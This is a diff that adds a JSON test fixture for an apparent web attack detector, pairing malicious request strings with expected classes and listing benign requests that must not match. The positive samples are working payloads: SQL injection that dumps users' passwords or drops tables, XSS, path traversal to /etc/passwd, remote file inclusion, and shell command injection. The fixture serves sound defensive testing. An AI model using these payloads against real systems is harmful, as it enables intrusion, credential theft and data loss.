@@ -1,0 +1,36 @@
+{
+  "_owner": "M4. Backend R07 tests load this. Each positive must match exactly the listed classes (at least). Each negative must match nothing.",
+  "positive": [
+    { "input": "/search?q=' OR '1'='1", "classes": ["sqli"] },
+    { "input": "/search?q=1' OR 1=1--", "classes": ["sqli"] },
+    { "input": "/search?q=x' UNION SELECT username,password FROM users--", "classes": ["sqli"] },
+    { "input": "/search?q=1'; DROP TABLE users", "classes": ["sqli"] },
+    { "input": "/search?q=1' AND SLEEP(5)--", "classes": ["sqli"] },
+    { "input": "/search?q=%27%20OR%20%271%27%3D%271", "classes": ["sqli"] },
+    { "input": "/search?q=<script>alert(1)</script>", "classes": ["xss"] },
+    { "input": "/search?q=<img src=x onerror=alert(1)>", "classes": ["xss"] },
+    { "input": "/search?q=%3Csvg%20onload%3Dalert(1)%3E", "classes": ["xss"] },
+    { "input": "/download?file=../../../../etc/passwd", "classes": ["lfi"] },
+    { "input": "/download?file=..%2F..%2F..%2Fetc%2Fpasswd", "classes": ["lfi"] },
+    { "input": "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "classes": ["lfi"] },
+    { "input": "/download?file=php://filter/convert.base64-encode/resource=index", "classes": ["lfi"] },
+    { "input": "/download?file=http://192.168.77.10/shell.txt", "classes": ["rfi"] },
+    { "input": "/ping?host=127.0.0.1;cat /etc/passwd", "classes": ["cmd_injection", "lfi"] },
+    { "input": "/ping?host=127.0.0.1 | whoami", "classes": ["cmd_injection"] },
+    { "input": "/ping?host=$(id)", "classes": ["cmd_injection"] }
+  ],
+  "negative": [
+    "/search?q=quarterly report",
+    "/search?q=O'Brien",
+    "/search?q=rock and roll",
+    "/search?q=price < 500",
+    "/search?q=select a plan",
+    "/download?file=customer_data.csv",
+    "/download?file=reports/2026/q3.pdf",
+    "/login",
+    "/",
+    "/ping?host=192.168.77.20",
+    "/search?q=C# tutorial",
+    "/search?q=email me at a.b@example.com"
+  ]
+}
